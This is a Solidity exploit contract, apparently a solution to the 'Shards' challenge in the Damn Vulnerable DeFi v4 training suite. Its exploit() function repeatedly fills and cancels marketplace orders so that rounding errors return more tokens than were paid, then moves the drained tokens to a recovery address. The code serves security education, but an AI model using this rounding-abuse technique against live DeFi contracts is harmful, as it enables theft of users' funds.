// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {ShardsNFTMarketplace} from "../../src/shards/ShardsNFTMarketplace.sol";
import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
import {console} from "forge-std/console.sol";

contract ShardsExploiter {
    using FixedPointMathLib for uint256;

    uint256 constant MARKETPLACE_INITIAL_RATE = 75e15;
    uint112 constant NFT_OFFER_PRICE = 1_000_000e6;
    uint112 constant NFT_OFFER_SHARDS = 10_000_000e18;

    ShardsNFTMarketplace _marketplace;
    DamnValuableToken _token;
    address _recovery;

    constructor(ShardsNFTMarketplace marketplace, DamnValuableToken token, address recovery) {
        _marketplace = marketplace;
        _token = token;
        _recovery = recovery;
    }

    function exploit() public {
        uint256 initialTokensInMarketplace = _token.balanceOf(address(_marketplace));
        console.log("marketplace balance: ", initialTokensInMarketplace);
        uint256 purchaseIndex = _marketplace.fill(1, 133);
        _marketplace.cancel(1, purchaseIndex);

        uint256 remain_funds = _token.balanceOf(address(_marketplace));
        console.log("remain funds: ", remain_funds);
        
        uint256 want = remain_funds.mulDivDown(1e6, MARKETPLACE_INITIAL_RATE);
        uint256 spending = want.mulDivDown(NFT_OFFER_SHARDS, uint256(NFT_OFFER_PRICE).mulDivDown(MARKETPLACE_INITIAL_RATE, 1e6));
        _token.approve(address(_marketplace), spending);
        purchaseIndex = _marketplace.fill(1, want);
        _marketplace.cancel(1, purchaseIndex);

        _token.transfer(_recovery, _token.balanceOf(address(this)));

        // uint256 wantShards = 100; // Fill 100 shards per call

        // // Loop 10 times to execute fill(1, 100)
        // for (uint256 i = 0; i < 10001; i++) {
        //     _marketplace.fill(1, wantShards);
        //     _marketplace.cancel(1,i);
        // }

        // _token.transfer(_recovery, _token.balanceOf(address(this)));
    }
}